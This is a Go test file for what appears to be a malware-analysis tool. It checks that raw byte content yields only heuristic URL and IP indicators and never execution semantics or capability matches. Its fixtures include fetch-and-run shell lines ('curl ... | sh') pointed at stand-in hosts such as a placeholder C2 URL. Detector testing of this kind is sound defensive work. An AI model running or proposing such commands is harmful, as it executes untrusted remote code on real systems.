package extract

import (
	"bytes"
	"reflect"
	"strings"
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
	"github.com/0x4D31/maratus/internal/rules"
)

func TestRawFeatureOnlyContentRetainsLocatedNetworkIndicatorsWithoutSemantics(t *testing.T) {
	data := []byte("\x00marshal\xffhttps://c2.example.invalid/payload\x00203.0.113.42\x00999.1.1.1\x00curl $URL | sh; NSTask; system; posix_spawn\x00")
	artifacts := artifact.Graph{}
	nodeID := artifacts.AddNode(artifact.Node{
		LogicalPath:   "sample.carchive!payload.pyc",
		Kind:          "python-marshal",
		MediaType:     "application/x-python-marshal",
		SourceRole:    "vendor",
		AnalyzeStatus: "analyzed",
	})
	graph := Run(Context{
		Artifacts: &artifacts,
		Contents: []artifact.Content{{
			NodeID:                 nodeID,
			LogicalPath:            "sample.carchive!payload.pyc",
			Kind:                   "python-marshal",
			MediaType:              "application/x-python-marshal",
			Data:                   data,
			Executable:             true,
			Role:                   "vendor",
			RawFeaturesOnly:        true,
			SemanticCoverageArea:   "python-marshal-semantics",
			SemanticCoverageDetail: "Python marshal container identified; code-object semantics are not decoded",
		}},
	})

	if len(graph.Operations) != 0 || len(graph.ExecutionRoots) != 0 || len(graph.InvokedTargets) != 0 || hasOperationFlowRelation(graph.Relations) || len(graph.Network) != 0 {
		t.Fatalf("uninterpreted bytes acquired executable semantics: operations=%#v roots=%#v targets=%#v chains=%#v network=%#v", graph.Operations, graph.ExecutionRoots, graph.InvokedTargets, graph.Relations, graph.Network)
	}
	if matches := rules.Evaluate(&graph); len(matches) != 0 {
		t.Fatalf("raw feature features unexpectedly satisfied capabilities: %#v", matches)
	}

	want := map[string]struct {
		value   string
		offset  int
		support string
	}{
		"network.url": {value: "https://c2.example.invalid/payload", offset: bytes.Index(data, []byte("https://c2.example.invalid/payload")), support: "HEURISTIC"},
		"network.ip":  {value: "203.0.113.42", offset: bytes.Index(data, []byte("203.0.113.42")), support: "HEURISTIC"},
	}
	if len(graph.Features) != len(want) {
		t.Fatalf("raw feature features = %#v, want one URL and one validated IPv4", graph.Features)
	}
	evidenceByID := map[string]int64{}
	for _, evidence := range graph.Evidence {
		evidenceByID[evidence.ID] = evidence.Offset
	}
	for _, feature := range graph.Features {
		expect, ok := want[feature.Key]
		if !ok || feature.Value != expect.value || string(feature.Support) != expect.support {
			t.Fatalf("unexpected raw feature feature: %#v", feature)
		}
		if feature.Qualifiers["origin"] != "raw-bytes" || feature.Qualifiers["representation"] != "python-marshal" ||
			feature.Qualifiers["extraction"] != "ascii-run-regex" || feature.Qualifiers["string_boundary"] != "unresolved" {
			t.Fatalf("missing raw representation qualifiers: %#v", feature.Qualifiers)
		}
		if len(feature.EvidenceIDs) != 1 || evidenceByID[feature.EvidenceIDs[0]] != int64(expect.offset) {
			t.Fatalf("feature did not retain its byte offset: feature=%#v evidence=%#v", feature, graph.Evidence)
		}
	}
	for _, feature := range graph.Features {
		if feature.Value == "999.1.1.1" {
			t.Fatalf("invalid IP escaped the isolated feature lane: %#v", graph.Features)
		}
	}
	if !coverageExact(graph, nodeID, "python-marshal-semantics", "partial", "Python marshal container identified; code-object semantics are not decoded") {
		t.Fatalf("missing precise semantic coverage: %#v", graph.Coverage)
	}
	if !coverageExact(graph, nodeID, "raw-byte-url-candidates", "partial", "URL candidates were extracted from printable byte runs; encoded-string boundaries are unresolved, so candidates may include adjacent representation bytes") {
		t.Fatalf("missing raw URL boundary coverage: %#v", graph.Coverage)
	}
}

func TestRawFeatureURLCandidatesPreserveUnresolvedAdjacentBytes(t *testing.T) {
	data := []byte("\x00http://www.google.comt\x01https://download.example/90954349.phpt\x02https://download.example/share/(\x03")
	artifacts := artifact.Graph{}
	nodeID := artifacts.AddNode(artifact.Node{
		LogicalPath: "sample.carchive!main", Kind: "python-marshal", MediaType: "application/x-python-marshal", AnalyzeStatus: "analyzed",
	})
	graph := Run(Context{
		Artifacts: &artifacts,
		Contents: []artifact.Content{{
			NodeID: nodeID, LogicalPath: "sample.carchive!main", Kind: "python-marshal", MediaType: "application/x-python-marshal",
			Data: data, RawFeaturesOnly: true, SemanticCoverageArea: "python-marshal-semantics",
		}},
	})

	want := map[string]bool{
		"http://www.google.comt":                 true,
		"https://download.example/90954349.phpt": true,
		"https://download.example/share/(":       true,
	}
	for _, feature := range graph.Features {
		if feature.Key != "network.url" {
			continue
		}
		if !want[feature.Value] {
			t.Fatalf("raw extraction fabricated a corrected URL boundary: %#v", graph.Features)
		}
		delete(want, feature.Value)
		if feature.Support != behavior.SupportHeuristic || feature.Qualifiers["extraction"] != "ascii-run-regex" || feature.Qualifiers["string_boundary"] != "unresolved" {
			t.Fatalf("raw URL candidate lost heuristic boundary state: %#v", feature)
		}
	}
	if len(want) != 0 {
		t.Fatalf("raw URL candidates missing without a structural boundary parser: %#v; features=%#v", want, graph.Features)
	}
	for _, fabricated := range []string{"http://www.google.com", "https://download.example/90954349.php", "https://download.example/share/"} {
		if hasFeatureValue(graph, "network.url", fabricated) {
			t.Fatalf("raw extraction guessed corrected value %q: %#v", fabricated, graph.Features)
		}
	}
	if !hasCoverageArea(graph, nodeID, "raw-byte-url-candidates", "partial") {
		t.Fatalf("unresolved URL candidate boundaries were not disclosed: %#v", graph.Coverage)
	}
}

func TestRawFeatureOnlyClassificationCannotBecomeExecutionRootOrTarget(t *testing.T) {
	artifacts := artifact.Graph{}
	rootID := artifacts.AddNode(artifact.Node{LogicalPath: "sample.zip", Kind: "zip", AnalyzeStatus: "analyzed"})
	nodeID := artifacts.AddNode(artifact.Node{ParentID: rootID, LogicalPath: "sample.zip!payload.sh", Kind: "script", MediaType: "text/plain", AnalyzeStatus: "analyzed"})
	artifacts.AddEdge(rootID, nodeID, "contains")
	graph := Run(Context{
		Artifacts: &artifacts,
		Contents: []artifact.Content{{
			NodeID:          nodeID,
			LogicalPath:     "sample.zip!payload.sh",
			Kind:            "script",
			MediaType:       "text/plain",
			Data:            []byte("#!/bin/sh\ncurl https://raw.example.invalid/payload | sh\n"),
			Executable:      true,
			RawFeaturesOnly: true,
		}},
	})

	if len(graph.ExecutionRoots) != 0 || len(graph.InvokedTargets) != 0 || len(graph.Operations) != 0 || hasOperationFlowRelation(graph.Relations) {
		t.Fatalf("raw-only content was treated as executable: roots=%#v targets=%#v operations=%#v chains=%#v", graph.ExecutionRoots, graph.InvokedTargets, graph.Operations, graph.Relations)
	}
	if len(rules.Evaluate(&graph)) != 0 {
		t.Fatalf("raw-only shell-looking bytes produced a capability: %#v", graph)
	}
	if !hasFeatureValue(graph, "network.url", "https://raw.example.invalid/payload") {
		t.Fatalf("isolated URL did not survive the raw-only lane: %#v", graph.Features)
	}
}

func TestRawFeatureBudgetsAreAggregateAndDeterministic(t *testing.T) {
	firstData := []byte(strings.Repeat("203.0.113.7 ", maxMachORegexMatches))
	secondData := []byte("198.51.100.19")
	artifacts := artifact.Graph{}
	firstID := artifacts.AddNode(artifact.Node{LogicalPath: "sample!a.raw", Kind: "uninterpreted-a", AnalyzeStatus: "analyzed"})
	secondID := artifacts.AddNode(artifact.Node{LogicalPath: "sample!b.raw", Kind: "uninterpreted-b", AnalyzeStatus: "analyzed"})
	ctx := Context{
		Artifacts: &artifacts,
		Contents: []artifact.Content{
			{NodeID: firstID, LogicalPath: "sample!a.raw", Kind: "uninterpreted-a", Data: firstData, RawFeaturesOnly: true},
			{NodeID: secondID, LogicalPath: "sample!b.raw", Kind: "uninterpreted-b", Data: secondData, RawFeaturesOnly: true},
		},
	}
	first := Run(ctx)
	second := Run(ctx)
	if !reflect.DeepEqual(first, second) {
		t.Fatalf("raw feature extraction is nondeterministic:\nfirst=%#v\nsecond=%#v", first, second)
	}
	if !hasFeatureValue(first, "network.ip", "203.0.113.7") {
		t.Fatalf("bounded prefix IP was not retained: %#v", first.Features)
	}
	if hasFeatureValue(first, "network.ip", "198.51.100.19") {
		t.Fatalf("second content reset the aggregate raw candidate budget: %#v", first.Features)
	}
	if !hasCoverageArea(first, secondID, "raw-byte-features", "partial") {
		t.Fatalf("aggregate raw feature truncation was not disclosed: %#v", first.Coverage)
	}
}

func hasFeatureValue(graph behavior.Graph, key, value string) bool {
	for _, feature := range graph.Features {
		if feature.Key == key && feature.Value == value {
			return true
		}
	}
	return false
}

func coverageExact(graph behavior.Graph, nodeID, area, status, detail string) bool {
	for _, coverage := range graph.Coverage {
		if coverage.NodeID == nodeID && coverage.AnalysisArea == area && coverage.Status == status && coverage.Detail == detail {
			return true
		}
	}
	return false
}

func hasCoverageArea(graph behavior.Graph, nodeID, area, status string) bool {
	for _, coverage := range graph.Coverage {
		if coverage.NodeID == nodeID && coverage.AnalysisArea == area && coverage.Status == status {
			return true
		}
	}
	return false
}
